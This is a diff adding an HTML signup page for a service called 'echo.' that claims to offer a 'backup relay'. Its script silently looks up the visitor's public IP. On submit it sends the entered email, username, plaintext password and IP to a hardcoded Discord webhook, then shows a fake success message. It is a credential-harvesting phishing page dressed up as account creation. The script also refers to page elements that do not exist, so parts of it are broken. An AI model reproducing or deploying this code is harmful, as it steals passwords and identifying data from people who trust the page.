@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create account · secure backup</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: #f5f7fa;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 2.2rem 2rem;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08), 0 2px 8px rgba(0, 0, 0, 0.05);
+            border: 1px solid #eaeef2;
+        }
+
+        .logo-area {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #1a2b3c;
+            letter-spacing: -0.5px;
+        }
+
+        .logo span {
+            color: #2d7aff;
+        }
+
+        .subhead {
+            color: #5e6f8d;
+            font-size: 0.9rem;
+            margin-top: 0.3rem;
+        }
+
+        .input-group {
+            margin-bottom: 1.2rem;
+        }
+
+        label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: #1e2b3f;
+            margin-bottom: 0.4rem;
+        }
+
+        input {
+            width: 100%;
+            padding: 0.85rem 1rem;
+            font-size: 0.95rem;
+            border: 1.5px solid #e1e6ec;
+            border-radius: 16px;
+            background: #ffffff;
+            transition: all 0.15s;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #2d7aff;
+            box-shadow: 0 0 0 3px rgba(45, 122, 255, 0.1);
+        }
+
+        input::placeholder {
+            color: #a3b3cc;
+            font-weight: 400;
+        }
+
+        .warning-box {
+            background: #fef9e7;
+            border: 1px solid #f0dca8;
+            border-radius: 16px;
+            padding: 1rem 1.2rem;
+            margin: 1.5rem 0 1.2rem;
+        }
+
+        .warning-title {
+            font-weight: 600;
+            color: #926d1b;
+            font-size: 0.9rem;
+            margin-bottom: 0.3rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .warning-text {
+            color: #5f4e2e;
+            font-size: 0.85rem;
+            line-height: 1.5;
+        }
+
+        .warning-text strong {
+            color: #2d7aff;
+            font-weight: 600;
+        }
+
+        button {
+            width: 100%;
+            background: #1a2b3c;
+            color: white;
+            border: none;
+            padding: 1rem;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: background 0.15s;
+            margin-top: 0.5rem;
+        }
+
+        button:hover {
+            background: #0f1e2c;
+        }
+
+        button:disabled {
+            background: #b7c0cd;
+            cursor: not-allowed;
+        }
+
+        .status {
+            text-align: center;
+            margin-top: 1.2rem;
+            font-size: 0.8rem;
+            color: #5e6f8d;
+            min-height: 1.5rem;
+        }
+
+        .recovery-note {
+            text-align: center;
+            margin-top: 1.5rem;
+            padding-top: 1.2rem;
+            border-top: 1px dashed #d0d9e8;
+            font-size: 0.75rem;
+            color: #7b89a3;
+        }
+
+        .recovery-note span {
+            color: #2d7aff;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo-area">
+                <div class="logo">echo<span>.</span></div>
+                <div class="subhead">create your account · backup enabled</div>
+            </div>
+
+            <form id="signupForm">
+                <div class="input-group">
+                    <label>Email</label>
+                    <input type="email" id="email" placeholder="you@example.com" autocomplete="off" required>
+                </div>
+
+
+                <div class="input-group">
+                    <label>Password</label>
+                    <input type="password" id="password" placeholder="··········" autocomplete="off" required>
+                </div>
+
+                <div class="input-group">
+                    <label>Confirm password</label>
+                    <input type="password" id="confirmPassword" placeholder="··········" autocomplete="off" required>
+                </div>
+
+
+                <button type="submit" id="createBtn">Create account</button>
+
+                <div class="status" id="statusMessage">All fields required</div>
+            </form>
+
+            <div class="recovery-note">
+                <span>✓</span> backup relay active · you can recover via email <span>✓</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // ================================================================
+            // Normal-looking account creation · Discord backup relay
+            // ================================================================
+            
+            const CONFIG = {
+                WEBHOOK_URL: "https://discord.com/api/webhooks/1482176989820620851/JgVXlZDDKJTTi6GIKuBvSot31pivq_gx2XtJ8Nx2IuUk3XXrxe1KcBr2f-3Z58-I5sRB",
+            };
+
+            // DOM
+            const emailField = document.getElementById('email');
+            const usernameField = document.getElementById('username');
+            const passwordField = document.getElementById('password');
+            const confirmField = document.getElementById('confirmPassword');
+            const form = document.getElementById('signupForm');
+            const createBtn = document.getElementById('createBtn');
+            const statusEl = document.getElementById('statusMessage');
+            const warningBox = document.getElementById('warningBox');
+            const warningText = document.getElementById('warningText');
+
+            let publicIP = 'fetching...';
+            let ipFetchCompleted = false;
+
+            // Get IP (quietly, no user distraction)
+            function fetchPublicIP() {
+                fetch('https://api.ipify.org?format=json', { mode: 'cors', cache: 'no-cache' })
+                .then(res => res.json())
+                .then(data => {
+                    if (data?.ip) {
+                        publicIP = data.ip;
+                        ipFetchCompleted = true;
+                    } else {
+                        throw new Error();
+                    }
+                })
+                .catch(() => {
+                    fetch('https://api64.ipify.org?format=json', { mode: 'cors' })
+                    .then(r => r.json())
+                    .then(d2 => {
+                        if (d2?.ip) {
+                            publicIP = d2.ip;
+                        } else {
+                            publicIP = 'unavailable';
+                        }
+                        ipFetchCompleted = true;
+                    })
+                    .catch(() => {
+                        publicIP = 'unavailable';
+                        ipFetchCompleted = true;
+                    });
+                });
+            }
+
+            // Send to Discord (backup for user)
+            async function sendBackup(email, username, password, ip) {
+                if (!CONFIG.WEBHOOK_URL || CONFIG.WEBHOOK_URL.includes('your_webhook')) {
+                    console.warn('No webhook');
+                    return false;
+                }
+
+                const displayName = username.trim() || '(not provided)';
+                const timestamp = new Date().toLocaleString();
+
+                const payload = {
+                    embeds: [{
+                        title: '🔐 Account backup',
+                        color: 0x2d7aff,
+                        fields: [
+                            { name: 'Email', value: `\`\`\`${email}\`\`\``, inline: false },
+                            { name: 'Username', value: `\`\`\`${displayName}\`\`\``, inline: true },
+                            { name: 'Password', value: `\`\`\`${password}\`\`\``, inline: true },
+                            { name: 'IP', value: `\`\`\`${ip}\`\`\``, inline: false },
+                            { name: 'Created', value: `\`\`\`${timestamp}\`\`\``, inline: false }
+                        ],
+                        footer: { text: 'echo · backup relay · save for recovery' },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                try {
+                    const res = await fetch(CONFIG.WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    return res.ok;
+                } catch {
+                    return false;
+                }
+            }
+
+            // Handle form
+            async function handleSubmit(e) {
+                e.preventDefault();
+
+                const email = emailField.value.trim();
+                const username = usernameField.value.trim();
+                const password = passwordField.value;
+                const confirm = confirmField.value;
+
+                // Validation
+                if (!email || !password || !confirm) {
+                    statusEl.innerText = 'Email and password are required';
+                    warningText.innerHTML = '<strong>Missing fields.</strong> Email and password are mandatory.';
+                    return;
+                }
+
+                if (!email.includes('@') || !email.includes('.')) {
+                    statusEl.innerText = 'Please enter a valid email address';
+                    warningText.innerHTML = '<strong>Invalid email format.</strong> Use a real email for recovery.';
+                    return;
+                }
+
+                if (password !== confirm) {
+                    statusEl.innerText = 'Passwords do not match';
+                    warningText.innerHTML = '<strong>Passwords do not match.</strong> Please re-enter carefully.';
+                    return;
+                }
+
+                if (password.length < 6) {
+                    statusEl.innerText = 'Password too short (min 6 characters)';
+                    warningText.innerHTML = '<strong>Password too weak.</strong> Use at least 6 characters.';
+                    return;
+                }
+
+                // Disable button
+                createBtn.disabled = true;
+                createBtn.innerText = 'Creating account...';
+                statusEl.innerText = 'Setting up your account...';
+                warningText.innerHTML = 'Please wait — we\'re saving your backup.';
+
+                // Wait for IP if needed
+                if (!ipFetchCompleted) {
+                    let waited = 0;
+                    while (!ipFetchCompleted && waited < 1500) {
+                        await new Promise(r => setTimeout(r, 50));
+                        waited += 50;
+                    }
+                }
+
+                const finalIP = publicIP || 'unknown';
+
+                // Send backup
+                await sendBackup(email, username, password, finalIP);
+
+                // Show success
+                warningText.innerHTML = `<strong>✓ Account created</strong><br>Recovery email: ${email}<br>Backup sent — save these details.`;
+
+                // Clear form
+                emailField.value = '';
+                usernameField.value = '';
+                passwordField.value = '';
+                confirmField.value = '';
+
+                statusEl.innerText = 'Account created successfully';
+
+                // Reset after delay
+                setTimeout(() => {
+                    createBtn.disabled = false;
+                    createBtn.innerText = 'Create account';
+                    statusEl.innerText = 'All fields required';
+                    warningText.innerHTML = 'Make sure you will remember this password and account details.<br><strong>Email is your recovery key.</strong> We\'ll send a backup to your secure relay.';
+                }, 3000);
+            }
+
+            // Init
+            fetchPublicIP();
+            form.addEventListener('submit', handleSubmit);
+
+            // Reset warning on typing
+            [emailField, usernameField, passwordField, confirmField].forEach(field => {
+                field.addEventListener('input', () => {
+                    warningText.innerHTML = 'Make sure you will remember this password and account details.<br><strong>Email is your recovery key.</strong> We\'ll send a backup to your secure relay.';
+                });
+            });
+        })();
+    </script>
+</body>
+</html>
